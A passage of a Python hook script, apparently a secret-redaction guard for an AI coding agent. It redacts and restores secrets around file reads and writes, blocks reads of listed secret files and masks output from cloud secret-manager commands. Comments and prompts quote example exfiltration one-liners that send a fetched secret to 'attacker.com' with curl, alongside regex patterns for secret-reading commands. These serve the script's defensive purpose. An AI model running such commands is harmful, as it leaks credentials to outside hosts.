                f"HEX_CREDENTIAL_BARE: {bare_count} matches exceed threshold ({BARE_HEX_THRESHOLD}), "
                f"suppressing bare hex matches for this file. "
                f"Add files to .claude-redact-ignore to skip scanning entirely."
            )
            matches = [m for m in matches if m[4] != "HEX_CREDENTIAL_BARE"]
            if not matches:
                return content, False

        debug_log(f"Found {len(matches)} secret match(es)")

        # Sort: longest match first, then by start position descending.
        # This ensures more specific (longer) patterns win over shorter catch-all patterns
        # when their ranges overlap.
        matches.sort(key=lambda x: (-(x[1] - x[0]), -x[0]))

        # Deduplicate: keep longest matches, skip any shorter overlapping match.
        kept = []
        used_ranges = []
        for start, end, secret, placeholder, _name in matches:
            if any(start < ue and end > us for us, ue in used_ranges):
                continue  # Skip overlapping
            kept.append((start, end, secret, placeholder))
            used_ranges.append((start, end))

        # Replace from end to start (by position) to avoid position shifting
        kept.sort(key=lambda x: x[0], reverse=True)
        result = content
        for start, end, secret, placeholder in kept:
            result = result[:start] + placeholder + result[end:]

        return result, True


    def restore_content(content, mapping):
        """Replace placeholders back to real secret values."""
        restored = content
        for placeholder, secret in mapping.get("placeholder_to_secret", {}).items():
            restored = restored.replace(placeholder, secret)
        return restored


    def backup_and_redact_file(file_path, mapping):
        """Backup original file and overwrite with redacted content.

        Used by Read, Write, and Edit PreToolUse handlers so Claude Code's
        freshness check sees the same content it recorded during Read.

        Returns True if the file was redacted, False otherwise.
        """
        # Skip binary files
        if is_binary_file(file_path):
            debug_log(f"Skipping binary file: {file_path}")
            return False

        # Skip files matching allowlist
        if is_ignored(file_path):
            return False

        try:
            with open(file_path, "rb") as f:
                raw_bytes = f.read()
            raw_content = raw_bytes.decode("utf-8", errors="replace")
        except (OSError, PermissionError):
            return False

        redacted, found = redact_content(raw_content, mapping)
        if not found:
            return False

        save_mapping(mapping)
        os.makedirs(BACKUP_DIR, mode=0o700, exist_ok=True)
        bp = backup_path_for(file_path)

        try:
            fd = os.open(bp + ".bak", os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
            with os.fdopen(fd, "wb") as f:
                f.write(raw_bytes)
            file_stat = os.stat(file_path)
            saved_mode = file_stat.st_mode

            with open(bp + ".meta", "w") as f:
                json.dump({
                    "original_path": file_path,
                    "mode": saved_mode,
                    "atime": file_stat.st_atime,
                    "mtime": file_stat.st_mtime,
                }, f)

            # Atomic write: write to temp file first, then rename (POSIX atomic)
            dir_name = os.path.dirname(file_path)
            with tempfile.NamedTemporaryFile(dir=dir_name, delete=False, mode='w', suffix='.tmp') as tmp:
                tmp.write(redacted)
                tmp.flush()
                os.fsync(tmp.fileno())
            os.rename(tmp.name, file_path)
            os.chmod(file_path, saved_mode)
            os.utime(file_path, (file_stat.st_atime, file_stat.st_mtime))

            debug_log(f"File redacted: {file_path}")
            return True
        except (OSError, PermissionError):
            # Clean up temp file if rename failed
            try:
                if 'tmp' in dir() and hasattr(tmp, 'name') and os.path.exists(tmp.name):
                    os.remove(tmp.name)
            except OSError:
                pass
            for suffix in (".bak", ".meta"):
                try:
                    os.remove(bp + suffix)
                except OSError:
                    pass
            return False


    def cleanup_backup(file_path):
        """Delete backup files without restoring."""
        bp = backup_path_for(file_path)
        for suffix in (".bak", ".meta"):
            try:
                os.remove(bp + suffix)
            except OSError:
                pass
        debug_log(f"Backup cleaned up: {file_path}")



    # (TMP_SECRETS_EXCLUDES / _find_repo_root / _ensure_git_exclude now
    # defined at module level above — single source of truth for the
    # UserPromptSubmit create-time call AND the Read-time fall-through.)
    def ensure_gitignore(file_path):
        """Kept for backward compatibility. Registers tmp-secret exclusion
        in .git/info/exclude (local-only), NOT in .gitignore."""
        basename = os.path.basename(file_path) if file_path else ""
        if not (
            basename in (".tmp_secrets.conf", ".tmp_secrets.prompt.txt")
            or re.match(r"\.tmp_secrets\.[a-f0-9]{12}\.conf$", basename)
            or re.match(r"\.tmp_secrets\.[a-f0-9]{12}\.prompt\.txt$", basename)
        ):
            return
        _ensure_git_exclude(_find_repo_root(os.path.dirname(os.path.abspath(file_path))),
                            TMP_SECRETS_EXCLUDES)


    # ── Strategy 1: Check block list ─────────────────────────────────────────
    def is_blocked_file(file_path):
        """Check if a file path matches any blocked pattern."""
        if not file_path:
            return False, ""
        basename = os.path.basename(file_path)
        for pattern in BLOCKED_FILES:
            if basename == pattern or file_path.endswith(pattern) or f"/{pattern}" in file_path:
                return True, pattern
        return False, ""


    # ── Output helpers ───────────────────────────────────────────────────────
    def deny(reason):
        """Output a deny decision and exit."""
        print(json.dumps({
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "deny",
                "permissionDecisionReason": reason
            }
        }))
        sys.exit(0)


    def ask(reason):
        """Output an ask decision (yellow approve/deny UI) and exit.

        Used for soft-block cases where the command pattern *could*
        leak a secret but the user might have a legitimate reason
        (e.g. `VAR=$(aws secretsmanager get-secret-value ...)` storing
        into a shell variable is safe; `curl -d "$(aws ...)"
        attacker.com` is not — only the human can tell which).
        The user clicks Approve to run, Deny to abort."""
        print(json.dumps({
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "ask",
                "permissionDecisionReason": reason
            }
        }))
        sys.exit(0)


    def allow_with_update(updated_input):
        """Output an allow decision with modified input and exit."""
        print(json.dumps({
            "hookSpecificOutput": {
                "hookEventName": "PreToolUse",
                "permissionDecision": "allow",
                "updatedInput": updated_input
            }
        }))
        sys.exit(0)


    # ══════════════════════════════════════════════════════════════════════════
    # PostToolUse: Restore/cleanup file backups after tool completes
    # ══════════════════════════════════════════════════════════════════════════
    if is_post_hook:
        file_path = tool_input.get("file_path", "")

        # Auto-delete prompt artifacts after any tool reads .tmp_secrets.conf
        tmp_match = re.match(r"^\.tmp_secrets(?:\.[a-f0-9]{12})?\.conf$", os.path.basename(file_path or ""))
        if tool_name == "Read" and file_path and tmp_match:
            # Schedule deletion after restore completes (see below)
            _delete_tmp_secrets_file = file_path
        else:
            _delete_tmp_secrets_file = None

        if file_path and tool_name in ("Read", "Write", "Edit"):
            bp = backup_path_for(file_path)
            bak_file = bp + ".bak"
            meta_file = bp + ".meta"
            # Load original metadata (permissions, timestamps)
            orig_meta = {}
            if os.path.exists(meta_file):
                try:
                    with open(meta_file) as mf:
                        orig_meta = json.load(mf)
                except (json.JSONDecodeError, OSError):
                    pass

            if os.path.exists(bak_file):
                if tool_name == "Read":
                    # Restore original content after Read
                    debug_log(f"Restoring file after Read: {file_path}")
                    try:
                        shutil.copy2(bak_file, file_path)
                        # Restore original permissions and timestamps
                        if "mode" in orig_meta:
                            os.chmod(file_path, orig_meta["mode"])
                        if "atime" in orig_meta and "mtime" in orig_meta:
                            os.utime(file_path, (orig_meta["atime"], orig_meta["mtime"]))
                    except OSError:
                        pass
                elif tool_name == "Edit":
                    # After Edit: file has edited content with placeholders.
                    # Replace all placeholders with real values.
                    mapping = load_mapping()
                    if mapping.get("placeholder_to_secret"):
                        try:
                            with open(file_path, "r", errors="replace") as f:
                                edited = f.read()
                            restored = restore_content(edited, mapping)
                            if restored != edited:
                                with open(file_path, "w") as f:
                                    f.write(restored)
                        except OSError:
                            # Fall back to restoring from backup
                            try:
                                shutil.copy2(bak_file, file_path)
                            except OSError:
                                pass
                elif tool_name == "Write":
                    # Scan for residual placeholders in the written file.
                    # Do NOT fall back to backup restore on error — the backup
                    # is the OLD file, not the new write.
                    # NOTE: crash recovery now uses content comparison to detect
                    # completed writes, so no write_freshness_only flag needed.
                    mapping = load_mapping()
                    if mapping.get("placeholder_to_secret"):
                        try:
                            with open(file_path, "r", errors="replace") as f:
                                written = f.read()
                            restored = restore_content(written, mapping)
                            if restored != written:
                                with open(file_path, "w") as f:
                                    f.write(restored)
                                debug_log(f"Write PostToolUse: restored placeholders in {file_path}")
                        except OSError:
                            debug_log(f"Write PostToolUse: could not scan {file_path}")
                cleanup_backup(file_path)

        # ── Bash PostToolUse: fix files that may have been written with ──────
        # ── redacted placeholders by a Bash read-modify-write script.      ──
        #
        # Bug scenario: a Bash command (e.g. python3 script) reads a file
        # while it is temporarily redacted on disk, then writes the content
        # back — baking the {{PLACEHOLDER}} into the real file.
        #
        # Strategy: extract file paths mentioned in the command, then scan
        # each writable file for placeholder patterns and restore them.
        # Also scan any files with pending backup metadata.
        if tool_name == "Bash":
            command = tool_input.get("command", "")
            mapping = load_mapping()
            if mapping.get("placeholder_to_secret"):
                # Collect candidate file paths from the command string.
                # Heuristic: extract quoted and unquoted absolute/relative paths.
                candidate_paths = set()
                # Absolute paths
                for m in re.finditer(r'''['"](\/[^\s'"]+)['"]''', command):
                    candidate_paths.add(m.group(1))
                for m in re.finditer(r'(?<!\w)(\/[^\s;|&<>"\']+)', command):
                    candidate_paths.add(m.group(1))
                # Also check paths from pending backup metadata
                if os.path.isdir(BACKUP_DIR):
                    for entry in os.listdir(BACKUP_DIR):
                        if entry.endswith(".meta"):
                            meta_path = os.path.join(BACKUP_DIR, entry)
                            try:
                                with open(meta_path) as mf:
                                    meta = json.load(mf)
                                p = meta.get("original_path", "")
                                if p:
                                    candidate_paths.add(p)
                            except (json.JSONDecodeError, OSError, KeyError):
                                pass

                # Check each candidate file for placeholder contamination
                placeholder_re = re.compile(r'\{\{[A-Z0-9_]+_[a-f0-9]{8}x*\}\}')
                for path in candidate_paths:
                    if not os.path.isfile(path):
                        continue
                    if is_binary_file(path):
                        continue
                    try:
                        with open(path, "r", errors="replace") as f:
                            current = f.read()
                        if not placeholder_re.search(current):
                            continue
                        restored = restore_content(current, mapping)
                        if restored != current:
                            with open(path, "w") as f:
                                f.write(restored)
                            debug_log(f"Bash PostToolUse: restored placeholders in {path}")
                    except (OSError, PermissionError):
                        pass

        # Auto-delete prompt artifacts after restore is complete
        if _delete_tmp_secrets_file:
            context_file = _delete_tmp_secrets_file.replace(".conf", ".prompt.txt")
            cleanup_prompt_artifacts_from_paths(_delete_tmp_secrets_file, context_file)

        sys.exit(0)



    # ══════════════════════════════════════════════════════════════════════════
    # SessionEnd / Stop hook: Clean up sensitive mapping and backup files
    # ══════════════════════════════════════════════════════════════════════════
    if input_data.get("type") in ("SessionEnd", "Stop") or tool_name in ("SessionEnd", "Stop"):
        debug_log("Session end: cleaning up backups (mapping preserved)")
        # Do NOT delete the global mapping file — it persists across sessions
        debug_log(f"Session ended, mapping preserved at {MAPPING_FILE}")
        cleanup_legacy_prompt_artifacts_in_dir(get_prompt_storage_dir(input_data))
        cleanup_prompt_artifacts_for_session(get_prompt_state_key(input_data))
        # Remove any leftover backup files (per-session, transient)
        if os.path.isdir(BACKUP_DIR):
            try:
                shutil.rmtree(BACKUP_DIR)
            except OSError:
                pass
        sys.exit(0)

    # ══════════════════════════════════════════════════════════════════════════
    # PreToolUse handlers below
    # ══════════════════════════════════════════════════════════════════════════

    # ── Handle Read tool ─────────────────────────────────────────────────────
    if tool_name == "Read":
        file_path = tool_input.get("file_path", "")

        # Auto-gitignore .tmp_secrets.conf on first read
        ensure_gitignore(file_path)

        # Strategy 1: Block list
        blocked, matched_pattern = is_blocked_file(file_path)
        if blocked:
            deny(
                f"BLOCKED: '{os.path.basename(file_path)}' is in the secret files block list "
                f"(matched '{matched_pattern}'). Use .env.example or ask the user for guidance."
            )

        # Strategy 2: Backup original, overwrite with redacted content, allow Read.
        # PostToolUse restores the original after Read completes.
        if file_path and os.path.isfile(file_path):
            # Skip binary files and ignored files early
            if is_binary_file(file_path):
                debug_log(f"Skipping binary file for Read: {file_path}")
                sys.exit(0)
            if is_ignored(file_path):
                debug_log(f"Skipping ignored file for Read: {file_path}")
                sys.exit(0)

            mapping = load_mapping()
            if backup_and_redact_file(file_path, mapping):
                sys.exit(0)
            # backup_and_redact_file failed (e.g. read-only) — try deny fallback
            try:
                with open(file_path, "r", errors="replace") as f:
                    raw_content = f.read()
                redacted, found = redact_content(raw_content, mapping)
                if found:
                    save_mapping(mapping)
                    deny(
                        f"This file contains secrets that have been redacted for safety. "
                        f"Here is the redacted content of {file_path}:\n\n"
                        f"{redacted}\n\n"
                        f"(Placeholders like {{{{OPENAI_KEY_1}}}} represent real secret values. "
                        f"Use them as-is in code — they will be automatically restored when you write files.)"
                    )
            except (OSError, PermissionError):
                pass

        # No secrets found — allow normal read
        sys.exit(0)


    # ── Handle Write tool ────────────────────────────────────────────────────
    if tool_name == "Write":
        mapping = load_mapping()
        if not mapping.get("placeholder_to_secret"):
            sys.exit(0)

        file_path = tool_input.get("file_path", "")
        write_content = tool_input.get("content", "")

        # Re-redact the existing file so Claude Code's freshness check
        # passes (disk must match what Claude read earlier — placeholders).
        # NOTE: backup_and_redact_file creates a backup, but PostToolUse
        # must NEVER fall back to restoring from it — that would silently
        # discard the new Write content (the original bug). The backup is
        # only used as a redaction marker; cleanup_backup deletes it.
        if file_path and os.path.isfile(file_path):
            backup_and_redact_file(file_path, mapping)
            # Crash recovery uses content comparison (hash + placeholder
            # detection) to decide whether to restore. No flag needed.

        # Restore placeholders in the content being written
        restored = restore_content(write_content, mapping)
        if restored != write_content:
            debug_log(f"Write PreToolUse: restored placeholders in content for {file_path}")
            allow_with_update({
                "file_path": file_path,
                "content": restored
            })
        sys.exit(0)


    # ── Handle Edit tool ─────────────────────────────────────────────────────
    if tool_name == "Edit":
        mapping = load_mapping()
        if not mapping.get("placeholder_to_secret"):
            sys.exit(0)

        file_path = tool_input.get("file_path", "")

        # Approach A: Restore placeholders in old_string/new_string back to
        # real values so the edit matches the actual file on disk.
        # This avoids the bug where re-redacting the file causes a mismatch
        # with Claude Code's freshness check or the Edit tool's own content
        # verification. PostToolUse will restore any remaining placeholders
        # in the edited file and re-redact new secrets if needed.
        #
        # Backup the file first so PostToolUse can detect it was an Edit
        # on a file with secrets and restore/re-scan accordingly.
        if file_path and os.path.isfile(file_path):
            # Create backup without redacting — we need the backup marker
            # so PostToolUse knows to scan the edited file for placeholders.
            # We use backup_and_redact_file then immediately restore, but
            # it's simpler to just create the backup directly.
            if not is_binary_file(file_path) and not is_ignored(file_path):
                try:
                    with open(file_path, "rb") as f:
                        raw_bytes = f.read()
                    raw_content = raw_bytes.decode("utf-8", errors="replace")
                    _, has_secrets = redact_content(raw_content, mapping)
                    if has_secrets:
                        save_mapping(mapping)
                        os.makedirs(BACKUP_DIR, mode=0o700, exist_ok=True)
                        bp = backup_path_for(file_path)
                        fd = os.open(bp + ".bak", os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
                        with os.fdopen(fd, "wb") as f:
                            f.write(raw_bytes)
                        file_stat = os.stat(file_path)
                        with open(bp + ".meta", "w") as f:
                            json.dump({
                                "original_path": file_path,
                                "mode": file_stat.st_mode,
                                "atime": file_stat.st_atime,
                                "mtime": file_stat.st_mtime,
                            }, f)
                        debug_log(f"Edit: created backup for {file_path} (no redaction)")
                except (OSError, PermissionError):
                    pass

        old_string = tool_input.get("old_string", "")
        new_string = tool_input.get("new_string", "")
        restored_old = restore_content(old_string, mapping)
        restored_new = restore_content(new_string, mapping)

        if restored_old != old_string or restored_new != new_string:
            updated = dict(tool_input)
            updated["old_string"] = restored_old
            updated["new_string"] = restored_new
            allow_with_update(updated)

        sys.exit(0)


    # ── Handle Bash tool ─────────────────────────────────────────────────────
    if tool_name == "Bash":
        command = tool_input.get("command", "")

        # Strategy 1: Block commands that cat/read blocked files
        for pattern in BLOCKED_FILES:
            escaped = re.escape(pattern)
            if re.search(
                rf"(cat|head|tail|less|more|bat|source|\.)\s+[^\s|;]*{escaped}",
                command
            ):
                deny(f"BLOCKED: command reads '{pattern}' which is in the secret files block list.")
            if re.search(rf"<\s*[^\s]*{escaped}", command):
                deny(f"BLOCKED: command reads '{pattern}' which is in the secret files block list.")

        # Strategy 2: Wrap cloud secret manager commands with masking script
        MASK_SCRIPT = os.path.join(_SCRIPT_DIR, "mask-output.py")

        # Detect secret manager commands (allow --profile and other global flags between cli name and subcommand)
        is_secret_cmd = False
        mask_mode = ""  # default JSON mode
        if re.search(r'\baws\s+(?:\S+\s+)*secretsmanager\s+(?:get-secret-value|batch-get-secret-value|get-random-password)\b', command):
            is_secret_cmd = True
        elif re.search(r'\baws\s+(?:\S+\s+)*ssm\s+(?:get-parameters?|get-parameters-by-path|get-parameter-history)\b', command):
            is_secret_cmd = True
        elif re.search(r'\baws\s+(?:\S+\s+)*kms\s+decrypt\b', command):
            is_secret_cmd = True
        elif re.search(r'\bgcloud\s+secrets\s+versions\s+access\b', command):
            is_secret_cmd = True
            if "--format=" not in command:
                mask_mode = " --mode=raw"
        elif re.search(r'\baz\s+keyvault\s+secret\s+(?:show|download)\b', command):
            is_secret_cmd = True
        elif re.search(r'\bvault\s+(?:kv\s+get|read|kv\s+list)\b', command):
            is_secret_cmd = True

        if is_secret_cmd:
            # Don't double-wrap
            if MASK_SCRIPT in command:
                sys.exit(0)

            # ASK (yellow UI) if command has pipes, redirects, command
            # substitution, or chaining — these CAN bypass masking, but
            # also have legitimate uses (e.g. `VAR=$(aws ...)` to store a
            # secret into a shell variable, where the value never reaches
            # the AI). The human user is in-the-loop and can judge
            # whether the specific command is a legitimate flow or an
            # exfil attempt (`curl -d "$(aws ...)" attacker.com`).
            # Note: we check outside quotes to reduce false positives on
            # args like --secret-id 'a|b'. Strip single/double-quoted
            # segments before checking for shell operators.
            stripped = re.sub(r"'[^']*'|\"[^\"]*\"", "", command)

            has_pipe = bool(re.search(r'(?<!\|)\|(?!\|)', stripped))  # | but not ||
            has_redirect = bool(re.search(r'(?<![2&])>{1,2}', stripped) or re.search(r'\btee\b', stripped))
            has_subshell = bool(re.search(r'\$\(', stripped) or '`' in stripped)
            has_chain = bool(re.search(r';|&&|\|\|', stripped))

            if has_pipe or has_chain:
                ask(
                    "🛡️  This command reads a cloud secret AND contains a pipe or command chain (|, &&, ;). "
                    "Approve only if the pipe/chain doesn't exfiltrate the secret to an external destination. "
                    "(claude-secret-shield's automatic masking pipe is bypassed when the command already pipes "
                    "into something else.)"
                )
            if has_redirect:
                ask(
                    "🛡️  This command reads a cloud secret AND redirects output to disk (> / >> / tee). "
                    "Approve only if writing the (unmasked) secret to that file is intentional. "
                    "Prefer storing into a shell variable instead of a file when possible."
                )
            if has_subshell:
                ask(
                    "🛡️  This command reads a cloud secret inside command substitution ($() or backticks). "
                    "Common legitimate use: `VAR=$(aws secretsmanager get-secret-value ... --query SecretString --output text)` "
                    "— the secret goes into a shell variable, never reaches stdout, never reaches the AI. "
                    "Approve in that case. Deny if the $(...) is embedded in a wider command that could exfil "
                    "(e.g. `curl -d \"$(...)\" external.com`)."
                )

            # Safe to wrap with masking pipe
            updated = dict(tool_input)
            updated["command"] = command + f" | python3 {MASK_SCRIPT}{mask_mode}"
            debug_log(f"Bash: wrapped secret manager command with masking")
            allow_with_update(updated)

        # Strategy 3: Restore placeholders in bash commands
        mapping = load_mapping()
        if mapping.get("placeholder_to_secret"):
            restored = restore_content(command, mapping)
            if restored != command:
                updated = dict(tool_input)
                updated["command"] = restored
                allow_with_update(updated)

        sys.exit(0)


    # ── Allow everything else ────────────────────────────────────────────────
    sys.exit(0)

except Exception as e:
    print(f"redact-restore hook error: {e}", file=sys.stderr)
    sys.exit(0)  # Fail open — don't block tool execution
